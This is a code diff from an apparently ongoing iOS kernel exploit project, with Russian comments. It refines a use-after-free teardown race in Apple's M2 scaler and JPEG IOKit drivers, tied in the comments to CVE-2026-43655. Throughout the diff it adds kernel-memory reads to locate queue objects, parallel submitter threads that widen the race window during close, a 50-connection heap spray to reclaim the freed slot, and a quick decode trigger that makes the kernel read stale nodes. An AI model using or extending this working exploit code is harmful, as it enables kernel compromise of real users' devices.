@@ -3791,7 +3791,8 @@ static void kpExp13DebugWalk(NSMutableString *r, const char *tag, uint64_t ttep,
 //       (18.6: размер 0x168, op-структура M2ScalerCSCRequest 0x21c0 — оффсеты
 //       отличаются от 26.4-билда оригинального PoC) и цепочка scheduler;
 //   (2) оффсет credit калибруется чтением после sel 10 (статика 18.6 из
-//       bug-hunt: sel 10 пишет [client+0x148]; PoC 26.4 имел per_client+0x158);
+//       bug-hunt: sel 10 пишет [client+0x148], submit sel 1 читает [UC+0x148]
+//       — подтверждено дизасмом 0x9258b80/0x9259678; PoC 26.4 имел +0x158);
 //   (3) параллельный submitter-тред на ВТОРОМ коннекшене гонит scheduler ВО
 //       ВРЕМЯ close victim'а (оригинал ждал следующего цикла от SpringBoard) —
 //       гонка идёт прямо по teardown, а не post-factum.
@@ -3867,6 +3868,52 @@ static void kpM2TDumpDiff(NSMutableString *r, uint64_t va, uint32_t size, NSStri
                       (q != p) ? @"  *CHANGED*" : @""]);
         shown++;
     }
+}
+
+// Итерация 2 (по железу 1.9.94): тихий снапшот объекта для diff'ов без шума.
+static BOOL kpM2TSnap(uint64_t va, uint8_t *dst, uint32_t size, NSMutableString *r)
+{
+    memset(dst, 0, size);
+    return kpLooksLikeKernelPointer(va) && kpRead(va, dst, size, "m2t snap", r);
+}
+
+// Печатает только изменившиеся qword'ы (→ значения), обновляет prev на месте.
+static int kpM2TDiffQuiet(NSMutableString *r, uint64_t va, uint32_t size, uint8_t *prev, NSString *tag)
+{
+    uint8_t cur[0x400];
+    if (size > sizeof(cur)) size = sizeof(cur);
+    if (!kpLooksLikeKernelPointer(va)) return 0;
+    memset(cur, 0, sizeof(cur));
+    if (!kpRead(va, cur, size, "m2t qdiff", r)) return -1;
+    int changed = 0;
+    for (uint32_t o = 0; o + 8 <= size; o += 8) {
+        uint64_t q = 0, p = 0;
+        memcpy(&q, cur + o, 8);
+        memcpy(&p, prev + o, 8);
+        if (q == p) continue;
+        if (!changed) kpM2TNote(r, tag);
+        kpM2TNote(r, [NSString stringWithFormat:@"      +0x%03x: %#018llx → %#018llx",
+                      o, (unsigned long long)p, (unsigned long long)q]);
+        memcpy(prev + o, &q, 8);
+        changed++;
+    }
+    return changed;
+}
+
+// Считает вхождения u32-маркера в объекте (калибровка credit / stale entries).
+static uint32_t kpM2TCountMarker(uint64_t va, uint32_t size, uint32_t marker, NSMutableString *r)
+{
+    uint8_t buf[0x800];
+    if (size > sizeof(buf)) size = sizeof(buf);
+    memset(buf, 0, sizeof(buf));
+    if (!kpLooksLikeKernelPointer(va) || !kpRead(va, buf, size, "m2t marker scan", r)) return 0;
+    uint32_t n = 0;
+    for (uint32_t o = 0; o + 4 <= size; o += 4) {
+        uint32_t v = 0;
+        memcpy(&v, buf + o, 4);
+        if (v == marker) n++;
+    }
+    return n;
 }
 
 // Параллельный submitter: гонит async-опы (sel 1, TSD+0x008=1) на своём
@@ -4019,6 +4066,56 @@ static void *kpM2TDriverMain(void *arg)
     kpM2TNote(r, [NSString stringWithFormat:@"  A4 вердикт: credit offset на этом железе = %#x (racesan предсказывал 0x148, PoC(26.4) 0x158)",
                   creditOff]);
 
+    // Итерация 2 (железо 1.9.94: маркер в клиенте НЕ нашёлся, async клиента не
+    // трогает): собираем все kernel-указатели из клиента — credit и op-записи
+    // живут в одном из pointee-объектов (per-pipeline контексты страйдом 0x38).
+    uint64_t clientPtrs[32];
+    uint32_t clientPtrCnt = 0;
+    {
+        uint8_t buf[0x200];
+        memset(buf, 0, sizeof(buf));
+        if (kpRead(victimVA, buf, sizeof(buf), "m2t client ptr walk", r)) {
+            for (uint32_t o = 0; o + 8 <= 0x168 && clientPtrCnt < 32; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, buf + o, 8);
+                uint64_t p = kp_untag_ptr(q);
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (uint32_t k = 0; k < clientPtrCnt; k++) if (clientPtrs[k] == p) { dup = YES; break; }
+                if (!dup) clientPtrs[clientPtrCnt++] = p;
+            }
+        }
+    }
+    kpM2TNote(r, [NSString stringWithFormat:@"  A4b: в клиенте %u уникальных kernel-указателей — credit/очередь ищем там", clientPtrCnt]);
+
+    // A4b: матрица кодировок sel 10 — 4 пробы с различимыми маркерами; ищем
+    // каждый сразу после своего вызова в клиенте И во всех pointee-объектах.
+    {
+        struct { uint32_t marker; const char *how; } probes[4] = {
+            { 0xCAFE0001, "struct+0" }, { 0xCAFE0002, "struct+8" },
+            { 0xCAFE0003, "scalar[0]" }, { 0xCAFE0004, "scalar[1]" },
+        };
+        for (int i = 0; i < 4; i++) {
+            uint8_t s10[0x18];
+            memset(s10, 0, sizeof(s10));
+            uint64_t sc[3] = {0, 0, 0};
+            if (i == 0) *(uint32_t *)(s10 + 0) = probes[i].marker;
+            if (i == 1) *(uint32_t *)(s10 + 8) = probes[i].marker;
+            if (i == 2) sc[0] = probes[i].marker;
+            if (i == 3) sc[1] = probes[i].marker;
+            kern_return_t pkr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            uint32_t where = 0;
+            uint64_t hitVA = 0;
+            if (kpM2TCountMarker(victimVA, 0x168, probes[i].marker, r)) { where = 1; hitVA = victimVA; }
+            for (uint32_t k = 0; k < clientPtrCnt && !where; k++) {
+                if (kpM2TCountMarker(clientPtrs[k], 0x400, probes[i].marker, r)) { where = 2; hitVA = clientPtrs[k]; }
+            }
+            kpM2TNote(r, [NSString stringWithFormat:@"    A4b %s маркер %#x: kr=0x%x → %@", probes[i].how, probes[i].marker, pkr,
+                          where == 1 ? @"В КЛИЕНТЕ" :
+                          where == 2 ? [NSString stringWithFormat:@"в pointee @ %#llx", (unsigned long long)hitVA] : @"нигде не найден"]);
+        }
+    }
+
     // A5: один async-оп на victim'е → diff scheduler'а: видно, куда ложатся
     // записи (count/list head/tail). Так узнаём op-entry linkage оффсеты.
     NSDictionary *sp5 = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
@@ -4057,19 +4154,61 @@ static void *kpM2TDriverMain(void *arg)
     if (schedVA) kpM2TDumpDiff(r, schedVA, 0x100, @"A5 scheduler после 1 async (смотри *CHANGED* — там живут записи)", schedSnap);
     kpM2TDumpDiff(r, victimVA, 0x168, @"A5 client после 1 async", clientSnap);
 
+    // A6 (итерация 2): тихие снапшоты ВСЕХ pointee-объектов → один async →
+    // печатаем только изменившиеся. Async клиента не трогает (прогон 1.9.94),
+    // значит op-записи/очередь живут в одном из pointee. Изменившийся объект =
+    // queue-кандидат, его VA уходит в фазу B для детекции stale-маркеров.
+    uint64_t queueVA = 0;
+    static uint8_t ptSnap[32 * 0x100];
+    memset(ptSnap, 0, sizeof(ptSnap));
+    for (uint32_t i = 0; i < clientPtrCnt; i++)
+        kpM2TSnap(clientPtrs[i], &ptSnap[i * 0x100], 0x100, r);
+    {
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
+        *(uint64_t *)(tsd + 0x008) = 1;
+        kern_return_t a6kr = IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+        kpM2TNote(r, [NSString stringWithFormat:@"  A6 async для pointee-diff: kr=0x%x", a6kr]);
+    }
+    usleep(3000);   // scheduler ставит/снимает запись
+    {
+        int hits = 0;
+        for (uint32_t i = 0; i < clientPtrCnt; i++) {
+            NSString *tag = [NSString stringWithFormat:@"    A6 pointee[%u] @ %#llx ИЗМЕНИЛСЯ после async:", i,
+                             (unsigned long long)clientPtrs[i]];
+            int c = kpM2TDiffQuiet(r, clientPtrs[i], 0x100, &ptSnap[i * 0x100], tag);
+            if (c > 0) {
+                hits++;
+                if (!queueVA) queueVA = clientPtrs[i];
+            }
+        }
+        kpM2TNote(r, [NSString stringWithFormat:@"  A6 вердикт: изменилось pointee-объектов: %d → queue-кандидат %#llx %@",
+                      hits, (unsigned long long)queueVA,
+                      queueVA ? @"(в фазе B считаю маркеры в нём)" : @"— записи вне pointees клиента (driver-global?)"]);
+    }
+
     // ================= ФАЗА B: гонка =================
     kpM2TNote(r, @"--- ФАЗА B: teardown race (паника возможна в любой момент) ---");
 
-    // Параллельный submitter на ВТОРОМ коннекшене — scheduler крутится во время close.
-    io_connect_t driver = IO_OBJECT_NULL;
+    // Параллельные submitter'ы на ДВУХ других коннекшенах (итерация 2: один
+    // тред успевал только ~5 опов за close — давление на окно удваиваем).
+    io_connect_t driver = IO_OBJECT_NULL, driver2 = IO_OBJECT_NULL;
     kern_return_t dkr = IOServiceOpen(svc, mach_task_self(), 0, &driver);
-    kpM2TNote(r, [NSString stringWithFormat:@"  B0 driver-коннекшен: conn=0x%x kr=0x%x", driver, dkr]);
+    kern_return_t dk2 = IOServiceOpen(svc, mach_task_self(), 0, &driver2);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B0 driver-коннекшены: #1 conn=0x%x kr=0x%x, #2 conn=0x%x kr=0x%x", driver, dkr, driver2, dk2]);
     if (dkr == KERN_SUCCESS && driver != IO_OBJECT_NULL) {
         uint8_t s10[0x18];
         memset(s10, 0, sizeof(s10));
         *(uint32_t *)s10 = 0xBEEF0002;
         uint64_t sc[3] = {0, 0, 0};
         IOConnectCallMethod(driver, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+    }
+    if (dk2 == KERN_SUCCESS && driver2 != IO_OBJECT_NULL) {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0xBEEF0003;
+        uint64_t sc[3] = {0, 0, 0};
+        IOConnectCallMethod(driver2, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
     }
 
     // B1: victim credit + 50 async-опов
@@ -4087,29 +4226,42 @@ static void *kpM2TDriverMain(void *arg)
             kpM2TNote(r, [NSString stringWithFormat:@"    kread client+%#x = %#x %@", creditOff, chk,
                           chk == 0xDEAD0001 ? @"— маркер на месте (калибровка верна)" : @"— НЕ совпал, калибровка мимо"]);
     }
+    // B1: victim credit + 150 async-опов (итерация 2: больше pending-записей =
+    // длиннее purge при teardown = шире окно гонки; в 1.9.94 submitter успевал
+    // только 5 опов за close — окно надо растягивать).
     int asyncOK = 0;
-    for (int i = 0; i < 50; i++) {
+    for (int i = 0; i < 150; i++) {
         uint8_t tsd[KP_M2_TSD_SIZE];
         memcpy(tsd, tsdBase, KP_M2_TSD_SIZE);
         *(uint64_t *)(tsd + 0x008) = 1;
         if (IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL) == KERN_SUCCESS) asyncOK++;
     }
-    kpM2TNote(r, [NSString stringWithFormat:@"  B1 async-опы victim: %d/50 OK — записи с credit=0xDEAD0001 в куче scheduler'а", asyncOK]);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B1 async-опы victim: %d/150 OK — записи с credit=0xDEAD0001 в куче scheduler'а", asyncOK]);
+    if (queueVA)
+        kpM2TNote(r, [NSString stringWithFormat:@"  B1 queue-кандидат @ %#llx: маркеров 0xDEAD0001 = %u (столько записей victim'а видно)",
+                      (unsigned long long)queueVA, kpM2TCountMarker(queueVA, 0x400, 0xDEAD0001, r)]);
 
-    // B2: submitter стартует ДО close — гонка идёт по живому teardown'у.
+    // B2: submitter'ы стартуют ДО close — гонка идёт по живому teardown'у.
     gM2TSubmits = 0;
     atomic_store(&gM2TStop, false);
     KPM2TDriverArgs dargs = { driver, srcID, dstID };
-    pthread_t dth;
+    KPM2TDriverArgs dargs2 = { driver2, srcID, dstID };
+    pthread_t dth, dth2;
     BOOL driverRuns = (dkr == KERN_SUCCESS && driver != IO_OBJECT_NULL && pthread_create(&dth, NULL, kpM2TDriverMain, &dargs) == 0);
-    kpM2TNote(r, [NSString stringWithFormat:@"  B2 submitter-тред: %@ (гонит async на driver-conn во время close)",
-                  driverRuns ? @"запущен" : @"НЕ запущен — close идёт без гонки (слабее)"]);
+    BOOL driver2Runs = (dk2 == KERN_SUCCESS && driver2 != IO_OBJECT_NULL && pthread_create(&dth2, NULL, kpM2TDriverMain, &dargs2) == 0);
+    kpM2TNote(r, [NSString stringWithFormat:@"  B2 submitter-треды: #1 %@, #2 %@ (гонят async во время close)",
+                  driverRuns ? @"запущен" : @"НЕ запущен",
+                  driver2Runs ? @"запущен" : @"НЕ запущен"]);
 
     // B3: teardown victim'а под гонящим scheduler'ом
-    kpM2TNote(r, @"  B3 IOServiceClose(victim) — точка невозврата (per_client 0x170 + ops освобождаются, записи scheduler'а висят)");
+    kpM2TNote(r, @"  B3 IOServiceClose(victim) — точка невозврата (per_client 0x168 (18.6; 0x170 в PoC 26.4) + ops освобождаются, записи scheduler'а висят)");
     kern_return_t ckr = IOServiceClose(victim);
     kpM2TNote(r, [NSString stringWithFormat:@"  B3 IOServiceClose: kr=0x%x — victim освобождён; submitter уже сделал %llu опов",
                   ckr, (unsigned long long)atomic_load(&gM2TSubmits)]);
+    if (queueVA)
+        kpM2TNote(r, [NSString stringWithFormat:@"  B3 queue ПОСЛЕ close: маркеров 0xDEAD0001 = %u %@", 
+                      kpM2TCountMarker(queueVA, 0x400, 0xDEAD0001, r),
+                      @"(>0 = teardown НЕ чистит записи — CVE-2026-43655 stale confirmed)"]);
 
     // B4: спрей 50 коннекшенов (credit=0xBEEF0002), НЕ закрываем — держим слот занятым.
     io_connect_t spray[50];
@@ -4127,6 +4279,10 @@ static void *kpM2TDriverMain(void *arg)
         }
     }
     kpM2TNote(r, [NSString stringWithFormat:@"  B4 спрей: %d/50 открыто, credit=0xBEEF0002 у каждого", sprayOK]);
+    if (queueVA)
+        kpM2TNote(r, [NSString stringWithFormat:@"  B4 queue ПОСЛЕ спрея: 0xDEAD0001 = %u, 0xBEEF0002 = %u (соседство маркеров = stale entry и spray-entry в одной очереди)",
+                      kpM2TCountMarker(queueVA, 0x400, 0xDEAD0001, r),
+                      kpM2TCountMarker(queueVA, 0x400, 0xBEEF0002, r)]);
 
     // B5: слот victim'а после спрея — кто-то занял? (kread по старому VA:
     // freed/reused память; чтение freed zone-объекта безопасно — он в зоне)
@@ -4158,6 +4314,7 @@ static void *kpM2TDriverMain(void *arg)
 
     atomic_store(&gM2TStop, true);
     if (driverRuns) pthread_join(dth, NULL);
+    if (driver2Runs) pthread_join(dth2, NULL);
     kpM2TNote(r, [NSString stringWithFormat:@"  submitter остановлен (%llu опов всего)", (unsigned long long)atomic_load(&gM2TSubmits)]);
 
     kpM2TNote(r, @"--- 60 раундов завершены, паники не было — баг не сработал в этом прогоне, повторить ---");
@@ -4969,6 +5126,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         "IOAccessoryManager", "IOAccessoryEAInterface", "AppleSARService", "ApplePPMCPMS",
         "AppleM2ScalerCSCDriver", "AppleAVE2", "AppleAVD", "AppleJPEGDriver",
         "IOAudio2Device", "IOStream", "IOHIDEventService", "IOGPU",
+        "IOReportHub", "AppleSmartIO2", "AppleAUC", "IOCEC",
         NULL,
     };
     for (int i = 0; services[i]; i++) {
@@ -5078,10 +5236,19 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // the freed slot with a valid object before the stale node is read, so
     // fullSpeedRequestExist always sees a live request. For the MTE fault we
     // need the stale node to read the FREED (FEEDFACE-poisoned) slot raw.
-    const int CYCLES = 60, V_REQS = 8;
+    // Раунд-10 (по kernelcache 18.6): queue_io_gated (0x91d2ce0) ходит по
+    // списку запросов драйвера ([driver+0x150]) при КАЖДОМ новом submit —
+    // значит stale-нода читается сразу от любого нового decode, не надо ждать
+    // HW-таймаут. Поэтому: (а) V_REQS 8→12 (больше in-flight в момент close),
+    // (б) быстрый sync-триггер валидным JPEG сразу после каждого close —
+    // queue-walk по stale-списку немедленно, краш за миллисекунды, а не за 10с.
+    // Reclaim-спрей на 18.6: JpegRequest живёт в typed kalloc zone
+    // (kalloc_type site 'JpegRequest', alloc ≥0x448) — чужие объекты
+    // (IOSurface/data) в эту зону НЕ попадут, reclaim = только новые decode.
+    const int CYCLES = 60, V_REQS = 12;
     int victimTotal = 0;
     BOOL healthy = YES;
-    kpNote(r, [NSString stringWithFormat:@"  --- %d циклов: victim(%d async, 3мс окно, close), БЕЗ reclaim (reclaim прячет баг) ---", CYCLES, V_REQS]);
+    kpNote(r, [NSString stringWithFormat:@"  --- %d циклов: victim(%d async, 3мс окно, close) + быстрый sync-триггер после КАЖДОГО close (queue-walk по stale-ноде сразу) ---", CYCLES, V_REQS]);
     for (int c = 0; c < CYCLES; c++) {
         io_connect_t victim = 0;
         kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
@@ -5089,6 +5256,27 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             victimTotal += kpJSubmitAsync(victim, srcID, dstID, W, H, V_REQS, 0x4141000000DEAD00ULL, r);
             usleep(3000); // in-flight окно: HW жуёт, close роняет mid-decode
             IOServiceClose(victim);
+        }
+        // Быстрый триггер: sync decode валидного JPEG на свежем коннекшене —
+        // queue_io_gated перечитывает список запросов (в т.ч. stale-ноду victim'а)
+        // при постановке нового запроса. Не ждём таймаут.
+        io_connect_t qt = 0;
+        if (IOServiceOpen(svc, mach_task_self(), 0, &qt) == KERN_SUCCESS && qt) {
+            KPJIosStruct in = {0}, out = {0};
+            in.sourceID    = srcID;
+            in.field_04    = W * H;
+            in.destID      = dstID;
+            in.field_0C    = W * H * 4;
+            in.width       = W;
+            in.height      = H;
+            in.outWidth    = W;
+            in.outHeight   = H;
+            in.subsampling = 3;
+            in.asyncToken  = 0;
+            size_t os = sizeof(out);
+            kern_return_t qkr = IOConnectCallStructMethod(qt, 1, &in, sizeof(in), &out, &os);
+            if (c < 3) kpNote(r, [NSString stringWithFormat:@"    quick-trigger[%d]: kr=0x%x", c, qkr]);
+            IOServiceClose(qt);
         }
         if ((c + 1) % 10 == 0) {
             io_connect_t hc = 0;
